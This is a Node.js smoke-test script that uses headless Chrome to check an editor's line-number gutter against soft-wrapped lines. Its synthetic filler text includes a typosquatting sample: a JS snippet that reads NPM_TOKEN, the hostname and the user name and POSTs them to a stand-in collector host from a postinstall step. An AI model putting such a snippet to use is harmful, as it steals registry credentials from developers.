#!/usr/bin/env node

/**
 * Real-browser check of the Documents editor gutter (line numbers) against
 * soft-wrapped lines (src/components/features/documents/DocumentEditor.jsx).
 *
 * THE BUGS: "it ignores the lines that span across multiple lines, it just
 * shows one number per line" and "when I press Enter the numbers jump around
 * / lag / flip back and forth". The gutter is a hand-rolled <div> next to a
 * plain <textarea>; its per-line heights came from three different code paths
 * (flat fallback before calibration, a character-count estimate while typing
 * behind a 200ms debounce, and an accurate DOM measurement only when idle) and
 * nothing re-measured when the Red Hat Mono web font swapped in.
 *
 * What this proves, in headless Chrome with TRUSTED input (CDP Input.*), on a
 * throwaway profile (fresh IndexedDB - never the user's documents), with
 * synthetic content only:
 *   - after typing a document with short lines, long word-wrapped lines, an
 *     unbreakable token and tabs, every gutter row height equals the height
 *     the browser actually gives that logical line (oracle: a cloned textarea
 *     fed line prefixes -> scrollHeight deltas) and the gutter total equals
 *     the textarea's own scrollHeight;
 *   - while pressing Enter rapidly inside a wrapped line, the gutter matches
 *     the oracle on the very next frame after every keystroke (no transient
 *     estimate, no later "fix-up" jump);
 *   - the gutter re-measures after the editor is resized (wrap points move);
 *   - the gutter is correct on a fresh open of the document after a reload
 *     (calibration + web font already settled or re-measured);
 *   - lines whose character count says "2 rows" but which the browser wraps
 *     to 3 (three ~60%-row words) are right immediately, not only after an
 *     idle delay - the measurable form of the "jump then fix" bug;
 *   - in a ~4000-line document a keystroke measures only its own line (the
 *     per-line cache), and the gutter total still equals the textarea's
 *     scrollHeight.
 *
 * Deliberately NOT named *.test.mjs (needs Chrome + a Vite dev server; see
 * workflow-canvas-smoke.mjs for the same conventions). Run by hand:
 *
 *   node tests/documents-gutter-smoke.mjs
 *
 * Environment: CHROME_BIN (path to Chrome/Chromium), SMOKE_PORT (default 5198).
 * Exit code: 0 = all checks passed, 1 = a check failed or Chrome is missing.
 */
import { spawn } from 'node:child_process';
import { existsSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const REPO = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const PORT = Number(process.env.SMOKE_PORT || 5198);
const DEBUG_PORT = PORT + 1000;
const URL = `http://localhost:${PORT}/`;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const CHROME_CANDIDATES = [
  process.env.CHROME_BIN,
  '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
  '/Applications/Chromium.app/Contents/MacOS/Chromium',
  '/usr/bin/google-chrome',
  '/usr/bin/google-chrome-stable',
  '/usr/bin/chromium',
  '/usr/bin/chromium-browser',
].filter(Boolean);
const CHROME = CHROME_CANDIDATES.find((p) => existsSync(p));
if (!CHROME) {
  console.error('FAIL: no Chrome/Chromium binary found - set CHROME_BIN=/path/to/chrome');
  process.exit(1);
}

const results = [];
function check(name, cond, detail) {
  results.push({ name, pass: !!cond });
  console.log(`${cond ? 'PASS' : 'FAIL'}: ${name}${detail ? ' | ' + detail : ''}`);
}

// ---------- 1. Vite dev server ----------
const vite = spawn(process.execPath, [path.join(REPO, 'node_modules', 'vite', 'bin', 'vite.js'), '--port', String(PORT), '--strictPort'], { cwd: REPO, stdio: 'ignore' });
const stop = (child) => new Promise((resolve) => {
  if (child.exitCode !== null || child.signalCode) return resolve();
  child.once('exit', resolve);
  child.kill();
  setTimeout(() => { try { child.kill('SIGKILL'); } catch { /* gone */ } resolve(); }, 3000);
});
let ready = false;
for (let i = 0; i < 240 && !ready; i++) { // up to 60s: Vite may re-optimize deps after a lockfile change
  try { ready = (await fetch(URL)).ok; } catch { await sleep(250); }
}
if (!ready) {
  await stop(vite);
  console.error(`FAIL: Vite dev server did not come up on :${PORT}`);
  process.exit(1);
}

// ---------- 2. Headless Chrome over CDP ----------
const profile = mkdtempSync(path.join(tmpdir(), 'doc-gutter-smoke-'));
const chrome = spawn(CHROME, [
  '--headless=new', '--disable-gpu', '--no-first-run', '--window-size=1400,900',
  `--remote-debugging-port=${DEBUG_PORT}`, `--user-data-dir=${profile}`, 'about:blank',
], { stdio: 'ignore' });
const cleanup = async () => {
  await stop(chrome);
  await stop(vite);
  try { rmSync(profile, { recursive: true, force: true }); } catch { /* best effort */ }
};

let exitCode = 1;
try {
  let targets;
  for (let i = 0; i < 40 && !targets; i++) {
    try { targets = await (await fetch(`http://localhost:${DEBUG_PORT}/json`)).json(); } catch { await sleep(250); }
  }
  const page = targets.find((t) => t.type === 'page');
  const ws = new WebSocket(page.webSocketDebuggerUrl);
  await new Promise((r) => (ws.onopen = r));

  let id = 0;
  const pending = new Map();
  const errors = [];
  ws.onmessage = (ev) => {
    const msg = JSON.parse(ev.data);
    if (msg.id && pending.has(msg.id)) { pending.get(msg.id)(msg); pending.delete(msg.id); return; }
    if (msg.method === 'Runtime.exceptionThrown') {
      errors.push('EXCEPTION: ' + (msg.params.exceptionDetails.exception?.description || msg.params.exceptionDetails.text));
    }
  };
  const send = (method, params = {}) => new Promise((resolve) => {
    const mid = ++id; pending.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method, params }));
  });
  const evaluate = async (expression) => {
    const r = await send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true });
    if (r.result?.exceptionDetails) throw new Error(r.result.exceptionDetails.exception?.description || 'eval failed');
    return r.result?.result?.value;
  };
  const insertText = (text) => send('Input.insertText', { text });
  const nextFrame = () => evaluate('new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r)))');

  await send('Runtime.enable');
  await send('Page.enable');
  await send('Page.navigate', { url: URL });
  await sleep(5000);

  // ---------- 3. Create a document with synthetic content ----------
  const clickNew = `(() => { const b = Array.from(document.querySelectorAll('button')).find(b => b.textContent.trim() === 'New Document'); if (!b) return false; b.click(); return true; })()`;
  check('Documents page shows the empty-state New Document button on a fresh profile', await evaluate(clickNew));
  await sleep(1500);
  check('a new document opens with the editor textarea', await evaluate(`!!document.querySelector('textarea')`));

  // Synthetic content: short lines, long word-wrapped lines, an unbreakable token, tabs, blanks
  const words = 'security policy bypass nonce hash strict-dynamic report-only unsafe-inline frame-ancestors upgrade-insecure-requests';
  const longLine = (n) => Array.from({ length: n }, (_, i) => words.split(' ')[i % 10]).join(' ');
  // Deliberately adversarial for a character-count estimate: tabs render as 8
  // columns but count as 1 char, long unbroken tokens (URLs, CSP directives,
  // quoted values) move whole words to the next row, and one 230-char token
  // must be broken mid-word.
  const lines = [
    '# Day 7 style notes (synthetic)',
    '',
    longLine(60),
    'short line',
    "Content-Security-Policy: default-src 'self'; script-src 'nonce-r4nd0mN0nc3V4lu3' 'strict-dynamic' https: 'unsafe-inline'; object-src 'none'; base-uri 'self'; report-uri https://csp.example.test/collector/endpoint/v2?site=notes",
    'x'.repeat(230) + '-unbreakable-token',
    '\t\tconst res = await fetch("https://api.example.test/v1/really/long/resource/path/that/keeps/going/and/going?with=query&and=more", { headers: { Authorization: token } });',
    '\t\t\tif (!res.ok) throw new Error("request failed with status " + res.status + " for " + res.url);',
    '',
    longLine(90),
    'See https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src and https://csp-evaluator.withgoogle.com/ for the strict-dynamic and nonce-based bypass discussion referenced above',
    'another short one',
    '- bullet ' + longLine(48),
    'last line',
  ];
  await evaluate(`(() => { const ta = document.querySelector('textarea'); ta.focus(); ta.setSelectionRange(ta.value.length, ta.value.length); })()`);
  await insertText(lines.join('\n'));
  await sleep(600);

  // In-page helpers: the gutter rows, and an oracle using a cloned <textarea>
  // (the browser's own textarea wrapping) fed line prefixes.
  await evaluate(`(() => {
    window.__gutterRows = () => {
      const g = Array.from(document.querySelectorAll('div')).find(d => d.style.width === '48px' && d.classList.contains('select-none'));
      if (!g) return null;
      return Array.from(g.firstElementChild.children).map(c => c.getBoundingClientRect().height);
    };
    window.__oracle = () => {
      const ta = document.querySelector('textarea');
      const cs = getComputedStyle(ta);
      const padV = (parseFloat(cs.paddingTop) || 0) + (parseFloat(cs.paddingBottom) || 0);
      const lines = ta.value.split('\\n');
      const clone = ta.cloneNode(false);
      clone.removeAttribute('id'); clone.value = '';
      Object.assign(clone.style, { position: 'absolute', visibility: 'hidden', top: '0', left: '0', height: '10px', width: ta.getBoundingClientRect().width + 'px', overflow: 'hidden' });
      ta.parentElement.appendChild(clone);
      const cum = [0];
      for (let i = 1; i <= lines.length; i++) { clone.value = lines.slice(0, i).join('\\n'); cum.push(clone.scrollHeight - padV); }
      clone.remove();
      const heights = []; for (let i = 0; i < lines.length; i++) heights.push(cum[i + 1] - cum[i]);
      return { heights, total: cum[lines.length], textareaTotal: ta.scrollHeight - padV, lineCount: lines.length };
    };
    window.__compare = () => {
      const rows = window.__gutterRows(); const o = window.__oracle();
      if (!rows) return { ok: false, reason: 'no gutter' };
      const bad = [];
      for (let i = 0; i < o.lineCount; i++) if (Math.round((rows[i] ?? -100) / 22.4) !== Math.round(o.heights[i] / 22.4)) bad.push({ line: i + 1, gutterRows: +((rows[i] ?? -100) / 22.4).toFixed(2), realRows: +(o.heights[i] / 22.4).toFixed(2) });
      const gutterTotal = rows.reduce((a, b) => a + b, 0);
      return { ok: bad.length === 0 && rows.length === o.lineCount && Math.abs(gutterTotal - o.textareaTotal) <= o.lineCount,
        rowsCount: rows.length, lineCount: o.lineCount, gutterTotal: Math.round(gutterTotal), textareaTotal: Math.round(o.textareaTotal), wrappedLines: o.heights.filter(h => h > 23).length, bad: bad.slice(0, 6) };
    };
  })()`);

  const settled = await evaluate('window.__compare()');
  check('typed document has several wrapped lines in this viewport (test is meaningful)', settled.wrappedLines >= 4, JSON.stringify(settled));
  check('settled: every gutter row height equals the browser\'s real height of that line; gutter total == textarea scrollHeight',
    settled.ok, JSON.stringify(settled));

  // ---------- 4. Rapid Enter presses inside a wrapped line ----------
  // Caret in the middle of the long third line, then Enter x6 as fast as the
  // protocol round-trip allows; sample the gutter on the next frame each time.
  await evaluate(`(() => { const ta = document.querySelector('textarea'); const idx = ta.value.indexOf(${JSON.stringify(lines[2].slice(0, 40))}) + 150; ta.focus(); ta.setSelectionRange(idx, idx); })()`);
  const immediate = [];
  for (let i = 0; i < 6; i++) {
    await insertText('\n');
    await nextFrame();
    immediate.push(await evaluate('window.__compare()'));
  }
  await sleep(400);
  const afterEnters = await evaluate('window.__compare()');
  const immediateBad = immediate.filter((s) => !s.ok);
  check('rapid Enter x6: gutter matches the real layout on the very next frame after EVERY keystroke (no transient estimate / flicker)',
    immediateBad.length === 0, `${immediateBad.length}/6 frames mismatched; first bad: ${JSON.stringify(immediateBad[0] || null)}`);
  check('after the Enter burst settles the gutter is exact and has the expected line count',
    afterEnters.ok && afterEnters.lineCount === lines.length + 6, JSON.stringify(afterEnters));

  // Typing characters inside a wrapped line (wrap points move on each key)
  const typed = [];
  for (const ch of 'strict-dynamic ') {
    await insertText(ch);
    await nextFrame();
    typed.push(await evaluate('window.__compare()'));
  }
  const typedBad = typed.filter((s) => !s.ok);
  check('typing inside a wrapped line: gutter exact on the next frame after each character',
    typedBad.length === 0, `${typedBad.length}/${typed.length} frames mismatched; first bad: ${JSON.stringify(typedBad[0] || null)}`);

  // ---------- 4b. Lines where a character-count estimate provably diverges ----------
  // Three words of ~60% of a row each: ceil(len / charsPerRow) says 2 rows,
  // real word-wrapping needs 3. Sample right after typing (inside any debounce
  // window) and again once settled: the gutter must be right BOTH times.
  const cpr = await evaluate(`(() => {
    const ta = document.querySelector('textarea'); const cs = getComputedStyle(ta);
    const c = document.createElement('canvas').getContext('2d'); c.font = cs.font;
    const cw = c.measureText('MMMMMMMMMM').width / 10;
    return Math.floor((ta.clientWidth - parseFloat(cs.paddingLeft) - parseFloat(cs.paddingRight)) / cw);
  })()`);
  const w60 = 'q'.repeat(Math.floor(cpr * 0.6));
  const w35 = 'z'.repeat(Math.floor(cpr * 0.35));
  const divergent = [`${w60} ${w60} ${w60}`, `${w35} ${w35} ${w35} ${w35} ${w35}`];
  await evaluate(`(() => { const ta = document.querySelector('textarea'); ta.focus(); ta.setSelectionRange(ta.value.length, ta.value.length); })()`);
  await insertText('\n' + divergent.join('\n'));
  await nextFrame();
  const divImmediate = await evaluate('window.__compare()');
  await sleep(400);
  const divSettled = await evaluate('window.__compare()');
  check(`estimate-divergent lines (charsPerRow=${cpr}): gutter is right on the next frame after typing them, not only after settling`,
    divImmediate.ok, JSON.stringify(divImmediate));
  check('estimate-divergent lines: gutter is right once settled', divSettled.ok, JSON.stringify(divSettled));

  // Enter burst inside the first divergent line - the user's "numbers jump / flip back and forth" case
  await evaluate(`(() => { const ta = document.querySelector('textarea'); const idx = ta.value.lastIndexOf(${JSON.stringify(divergent[0])}) + ${w60.length + 1}; ta.focus(); ta.setSelectionRange(idx, idx); })()`);
  const burst = [];
  for (let i = 0; i < 4; i++) {
    await insertText('\n');
    await nextFrame();
    burst.push(await evaluate('window.__compare()'));
  }
  await sleep(400);
  const burstSettled = await evaluate('window.__compare()');
  const burstBad = burst.filter((s) => !s.ok);
  check('Enter burst inside an estimate-divergent line: gutter exact on the next frame after every Enter (no jump-then-fix)',
    burstBad.length === 0, `${burstBad.length}/4 frames mismatched; first bad: ${JSON.stringify(burstBad[0] || null)}`);
  check('Enter burst settled state is exact', burstSettled.ok, JSON.stringify(burstSettled));

  // ---------- 5. Resize: wrap points move, gutter must follow ----------
  await send('Emulation.setDeviceMetricsOverride', { width: 950, height: 900, deviceScaleFactor: 1, mobile: false });
  await sleep(500);
  const narrow = await evaluate('window.__compare()');
  check('after narrowing the window the gutter re-measures and matches the new wrapping', narrow.ok && narrow.wrappedLines >= settled.wrappedLines, JSON.stringify(narrow));
  await send('Emulation.clearDeviceMetricsOverride');
  await sleep(500);
  const wide = await evaluate('window.__compare()');
  check('after widening again the gutter matches once more', wide.ok, JSON.stringify(wide));

  // ---------- 6. Fresh open after a reload (calibration + web font) ----------
  await sleep(1200); // let autosave persist to IndexedDB
  await send('Page.navigate', { url: 'about:blank' });
  await sleep(300);
  await send('Page.navigate', { url: URL });
  await sleep(5000);
  let reopened = await evaluate(`!!document.querySelector('textarea') && document.querySelector('textarea').value.includes('unbreakable-token')`);
  if (!reopened) {
    // Not auto-reopened: click the document in the sidebar
    await evaluate(`(() => { const el = Array.from(document.querySelectorAll('span, div, button')).find(e => e.children.length === 0 && /Untitled/i.test(e.textContent)); if (el) el.click(); })()`);
    await sleep(2500);
    reopened = await evaluate(`!!document.querySelector('textarea') && document.querySelector('textarea').value.includes('unbreakable-token')`);
  }
  check('the synthetic document reopens after a reload', reopened);
  if (reopened) {
    await evaluate(`(() => {
      window.__gutterRows = window.__gutterRows || null;
    })()`);
    // helpers were lost with the reload - re-install them
    await evaluate(`(() => {
      window.__gutterRows = () => { const g = Array.from(document.querySelectorAll('div')).find(d => d.style.width === '48px' && d.classList.contains('select-none')); return g ? Array.from(g.firstElementChild.children).map(c => c.getBoundingClientRect().height) : null; };
      window.__oracle = () => { const ta = document.querySelector('textarea'); const cs = getComputedStyle(ta); const padV = (parseFloat(cs.paddingTop) || 0) + (parseFloat(cs.paddingBottom) || 0); const lines = ta.value.split('\\n'); const clone = ta.cloneNode(false); clone.removeAttribute('id'); clone.value = ''; Object.assign(clone.style, { position: 'absolute', visibility: 'hidden', top: '0', left: '0', height: '10px', width: ta.getBoundingClientRect().width + 'px', overflow: 'hidden' }); ta.parentElement.appendChild(clone); const cum = [0]; for (let i = 1; i <= lines.length; i++) { clone.value = lines.slice(0, i).join('\\n'); cum.push(clone.scrollHeight - padV); } clone.remove(); const heights = []; for (let i = 0; i < lines.length; i++) heights.push(cum[i + 1] - cum[i]); return { heights, total: cum[lines.length], textareaTotal: ta.scrollHeight - padV, lineCount: lines.length }; };
      window.__compare = () => { const rows = window.__gutterRows(); const o = window.__oracle(); if (!rows) return { ok: false, reason: 'no gutter' }; const bad = []; for (let i = 0; i < o.lineCount; i++) if (Math.round((rows[i] ?? -100) / 22.4) !== Math.round(o.heights[i] / 22.4)) bad.push({ line: i + 1, gutterRows: +((rows[i] ?? -100) / 22.4).toFixed(2), realRows: +(o.heights[i] / 22.4).toFixed(2) }); const gutterTotal = rows.reduce((a, b) => a + b, 0); return { ok: bad.length === 0 && rows.length === o.lineCount && Math.abs(gutterTotal - o.textareaTotal) <= o.lineCount, rowsCount: rows.length, lineCount: o.lineCount, gutterTotal: Math.round(gutterTotal), textareaTotal: Math.round(o.textareaTotal), wrappedLines: o.heights.filter(h => h > 23).length, bad: bad.slice(0, 6) }; };
    })()`);
    const fresh = await evaluate('window.__compare()');
    const fontLoaded = await evaluate(`document.fonts.check('14px "Red Hat Mono"')`);
    check('on a fresh open the gutter already matches the real (web-font) wrapping - no one-row-per-line gutter', fresh.ok && fresh.wrappedLines >= 4, JSON.stringify({ fontLoaded, ...fresh }));
  }

  // ---------- 6b. Long markdown document, pixel-exact, pasted then typed ----------
  // Structure of the user's document: headings, wrapping prose, fenced code
  // with tabs, a numbered list whose items 1 and 3 wrap, closing paragraph,
  // trailing blank lines - 125+ lines. Alignment is checked in PIXELS (not
  // rows) at the start, middle and end, and the caret's row against the gutter
  // number, because the earlier bugs here were 2px-per-paragraph shortfalls
  // and a 1/64px-per-row drift that whole-row comparisons cannot see.
  const pxCompare = `(() => {
    const ta = document.querySelector('textarea'); const cs = getComputedStyle(ta);
    const padT = parseFloat(cs.paddingTop) || 0, padB = parseFloat(cs.paddingBottom) || 0;
    const g = Array.from(document.querySelectorAll('div')).find(d => d.style.width === '48px' && d.classList.contains('select-none'));
    const rowEls = Array.from(g.firstElementChild.children); const rows = rowEls.map(c => c.getBoundingClientRect().height);
    const lines = ta.value.split('\\n');
    const clone = ta.cloneNode(false); clone.removeAttribute('id'); clone.value = '';
    Object.assign(clone.style, { position: 'absolute', visibility: 'hidden', top: '0', left: '0', height: '10px', width: ta.getBoundingClientRect().width + 'px', overflow: 'hidden' });
    ta.parentElement.appendChild(clone);
    const cum = [0]; for (let i = 1; i <= lines.length; i++) { clone.value = lines.slice(0, i).join('\\n'); cum.push(clone.scrollHeight - padT - padB); }
    clone.remove();
    let gsum = 0, maxDrift = 0, worst = null; const perLineBad = [];
    for (let i = 0; i < lines.length; i++) {
      gsum += rows[i]; const drift = gsum - cum[i + 1];
      if (Math.abs(drift) > Math.abs(maxDrift)) { maxDrift = drift; worst = i + 1; }
      const real = cum[i + 1] - cum[i]; if (Math.abs(rows[i] - real) > 1.5) perLineBad.push({ line: i + 1, gutter: +rows[i].toFixed(2), real, text: lines[i].slice(0, 24) });
    }
    // Caret row vs gutter number at the END: scroll to bottom, caret on the last line
    ta.focus(); ta.setSelectionRange(ta.value.length, ta.value.length); ta.scrollTop = 1e9; g.scrollTop = ta.scrollTop;
    const taR = ta.getBoundingClientRect(); const last = lines.length - 1;
    const realLastTop = taR.top + padT + cum[last] - ta.scrollTop; const gutterLastTop = rowEls[last].getBoundingClientRect().top;
    // ... and in the MIDDLE: scroll line 60 to the top of the viewport
    const mid = Math.min(60, last); ta.scrollTop = padT + cum[mid - 1] - 40; g.scrollTop = ta.scrollTop;
    const realMidTop = taR.top + padT + cum[mid - 1] - ta.scrollTop; const gutterMidTop = rowEls[mid - 1].getBoundingClientRect().top;
    // ... and at the START
    ta.scrollTop = 0; g.scrollTop = 0;
    const realFirstTop = taR.top + padT; const gutterFirstTop = rowEls[0].getBoundingClientRect().top;
    return { lineCount: lines.length, wrappedLines: rows.filter(r => r > 23).length, maxDrift: +maxDrift.toFixed(2), worstLine: worst,
      driftAt: { l10: +(rows.slice(0, 10).reduce((a, b) => a + b, 0) - cum[10]).toFixed(2), l60: +(rows.slice(0, mid).reduce((a, b) => a + b, 0) - cum[mid]).toFixed(2), last: +(gsum - cum[lines.length]).toFixed(2) },
      perLineBad: perLineBad.slice(0, 5), caretVsGutter: { end: +(realLastTop - gutterLastTop).toFixed(2), middle: +(realMidTop - gutterMidTop).toFixed(2), start: +(realFirstTop - gutterFirstTop).toFixed(2) },
      gutterTotal: +gsum.toFixed(2), textareaContent: ta.scrollHeight - padT - padB, rowPitch: +(rows[0]).toFixed(4) };
  })()`;
  const pxOk = (r) => Math.abs(r.maxDrift) <= 1.5 && r.perLineBad.length === 0 && Object.values(r.caretVsGutter).every((v) => Math.abs(v) <= 1.5);

  const vocab = (words + ' typosquatting dependency registry maintainer publish token lockfile provenance').split(' ');
  const P = (n, seed) => Array.from({ length: n }, (_, i) => vocab[(i * 7 + seed) % vocab.length]).join(' ');
  const doc = [];
  doc.push('# Day 8 - Typosquatting Dependency (synthetic)', '');
  for (let p = 0; p < 6; p++) doc.push(P(45 + p * 9, p) + '.', '');
  doc.push('## Reproduction', '', '```bash', 'npm install reqeusts', '# note the transposed letters above', 'npm ls | grep -i reqeusts', '```', '');
  doc.push('```js', 'const pkg = require("reqeusts");', '\tconst payload = { token: process.env.NPM_TOKEN, host: require("os").hostname(), user: process.env.USER };', '\tfetch("https://collector.example.test/v1/ingest?source=postinstall&campaign=typosquat-2026", { method: "POST", body: JSON.stringify(payload) });', '```', '');
  for (let p = 0; p < 10; p++) doc.push('### Section ' + (p + 1), '', P(30 + (p % 3) * 20, p + 11) + '.', '', '- ' + P(8, p), '- ' + P(26, p + 3), '');
  doc.push('## Mitigations', '', '1. ' + P(34, 21) + ' (see the registry cooldown notes).', '2. Pin exact versions.', '3. ' + P(31, 5) + '.', '4. Review lockfile diffs.', '');
  doc.push('Closing paragraph: ' + P(40, 9) + '.', '', '');
  const longDoc = doc.join('\n');

  // Paste path (no custom onPaste handler exists; this is the browser's native paste)
  await evaluate(`(() => { const ta = document.querySelector('textarea'); ta.focus(); ta.select(); })()`);
  let pastePath = 'clipboard';
  try {
    await send('Browser.grantPermissions', { permissions: ['clipboardReadWrite', 'clipboardSanitizedWrite'], origin: URL.replace(/\/$/, '') });
    await send('Emulation.setFocusEmulationEnabled', { enabled: true }); // headless: clipboard needs a focused document
    const wrote = await evaluate(`navigator.clipboard.writeText(${JSON.stringify(longDoc)}).then(() => true).catch(e => 'ERR ' + e.message)`);
    if (wrote !== true) throw new Error(String(wrote));
    await send('Input.dispatchKeyEvent', { type: 'keyDown', key: 'v', code: 'KeyV', modifiers: 4, commands: ['paste'] });
    await send('Input.dispatchKeyEvent', { type: 'keyUp', key: 'v', code: 'KeyV', modifiers: 4 });
    await sleep(300);
    const pasted = await evaluate(`document.querySelector('textarea').value.includes('Closing paragraph:')`);
    if (!pasted) throw new Error('paste command did not insert');
  } catch (e) {
    pastePath = 'insertText (' + e.message + ')';
    await evaluate(`(() => { const ta = document.querySelector('textarea'); ta.focus(); ta.select(); })()`);
    await insertText(longDoc);
  }
  await sleep(700);
  const pastedNow = await evaluate(pxCompare);
  check(`long markdown document pasted in one go (${pastePath}): every gutter row equals the real row height within 1px, no cumulative drift, caret row == gutter number at start/middle/end`,
    pastedNow.lineCount === doc.length && pastedNow.wrappedLines >= 20 && pxOk(pastedNow), JSON.stringify(pastedNow));

  // Typed path: paragraphs appended one at a time (each one is the last line
  // of its own measurement batch - the case that used to lose 2px per paragraph)
  await evaluate(`(() => { const ta = document.querySelector('textarea'); ta.focus(); ta.setSelectionRange(ta.value.length, ta.value.length); })()`);
  for (let p = 0; p < 8; p++) {
    await insertText('Typed paragraph ' + (p + 1) + ': ' + P(44 + p * 5, 30 + p) + '.\n\n');
    await nextFrame();
  }
  await sleep(500);
  const typedNow = await evaluate(pxCompare);
  check('after typing 8 more wrapping paragraphs one by one: still pixel-exact at start/middle/end, no drift, caret row == gutter number on the last line',
    typedNow.lineCount === doc.length + 16 && pxOk(typedNow), JSON.stringify(typedNow));

  // ---------- 7. Large document: per-keystroke cost stays per-line ----------
  // ~4000 lines (half of them wrapping). Count the hidden measuring mirrors the
  // editor appends to <body> and how many line markers each carries: the first
  // paint measures everything once, a keystroke must measure only its own line.
  // Replace the open document's content (select-all + insert) rather than
  // creating another document.
  const bigOpened = await evaluate(`!!document.querySelector('textarea')`);
  if (bigOpened) {
    await evaluate(`(() => {
      window.__mirrors = [];
      window.__mo = new MutationObserver((muts) => { for (const m of muts) for (const n of m.addedNodes) {
        if (n.nodeType === 1 && n.tagName === 'DIV' && n.style.whiteSpace === 'pre-wrap') window.__mirrors.push(n.querySelectorAll('span').length);
      } });
      window.__mo.observe(document.body, { childList: true });
      const ta = document.querySelector('textarea'); ta.focus(); ta.select();
    })()`);
    const bigLines = [];
    for (let i = 0; i < 4000; i++) bigLines.push(i % 2 ? `line ${i} ` + longLine(30) : `line ${i}`);
    const t0 = Date.now();
    await insertText(bigLines.join('\n'));
    await nextFrame();
    const bigFirst = await evaluate(`({ mirrors: window.__mirrors.length, maxSpans: Math.max(0, ...window.__mirrors), rows: (window.__gutterRows() || []).length })`);
    const bigMs = Date.now() - t0;
    // Informational: cost of one full-document mirror measurement (what the
    // first paint pays once; afterwards keystrokes measure a single line).
    const mirrorMs = await evaluate(`(() => {
      const ta = document.querySelector('textarea'); const cs = getComputedStyle(ta); const lines = ta.value.split('\\n');
      const t = performance.now();
      const div = document.createElement('div');
      Object.assign(div.style, { position: 'fixed', visibility: 'hidden', top: '-9999px', left: '-9999px', width: ta.clientWidth + 'px', boxSizing: 'border-box', padding: cs.padding, font: cs.font, lineHeight: cs.lineHeight, tabSize: cs.tabSize, whiteSpace: 'pre-wrap', wordWrap: 'break-word', overflowWrap: 'break-word', overflow: 'hidden' });
      const marks = []; const frag = document.createDocumentFragment();
      for (const l of lines) { const m = document.createElement('span'); marks.push(m); frag.appendChild(m); frag.appendChild(document.createTextNode(l + '\\n')); }
      const end = document.createElement('span'); marks.push(end); frag.appendChild(end); div.appendChild(frag); document.body.appendChild(div);
      let s = 0; for (const m of marks) s += m.getBoundingClientRect().top; div.remove();
      return Math.round(performance.now() - t);
    })()`);
    check('large doc (4000 lines): first paint measures all lines in one batch and renders 4000 gutter rows',
      bigFirst.rows === 4000 && bigFirst.maxSpans >= 2001, JSON.stringify({ ...bigFirst, pasteRoundTripMs: bigMs, fullMirrorMeasureMs: mirrorMs }));
    await evaluate('window.__mirrors.length = 0');
    await insertText('x');
    await nextFrame();
    const bigKey = await evaluate(`({ mirrors: window.__mirrors.length, maxSpans: Math.max(0, ...window.__mirrors) })`);
    check('large doc: a keystroke measures only the edited line (1 mirror, 1 line marker + end marker), never the whole document',
      bigKey.mirrors >= 1 && bigKey.maxSpans <= 2, JSON.stringify(bigKey));
    const bigTotal = await evaluate(`(() => { const ta = document.querySelector('textarea'); const cs = getComputedStyle(ta); const padV = (parseFloat(cs.paddingTop) || 0) + (parseFloat(cs.paddingBottom) || 0); const rows = window.__gutterRows(); return { gutterTotal: Math.round(rows.reduce((a, b) => a + b, 0)), textareaTotal: Math.round(ta.scrollHeight - padV), rows: rows.length }; })()`);
    check('large doc: gutter total height equals the textarea\'s real content height (wrapped lines counted)',
      Math.abs(bigTotal.gutterTotal - bigTotal.textareaTotal) <= 4000 * 0.5 && bigTotal.rows === 4000 && bigTotal.textareaTotal > 4000 * 22, JSON.stringify(bigTotal));
    await evaluate('window.__mo.disconnect()');
  } else {
    check('large doc: an editor textarea is available for the large-document check', false);
  }

  check('no uncaught exceptions in the page', errors.length === 0, errors.slice(0, 3).join(' || '));

  ws.close();
  const failed = results.filter((r) => !r.pass);
  console.log(`\n${results.length - failed.length}/${results.length} checks passed`);
  exitCode = failed.length ? 1 : 0;
} catch (err) {
  console.log('FAIL: unexpected error |', err && err.stack ? err.stack : err);
  exitCode = 1;
} finally {
  await cleanup();
}
process.exit(exitCode);
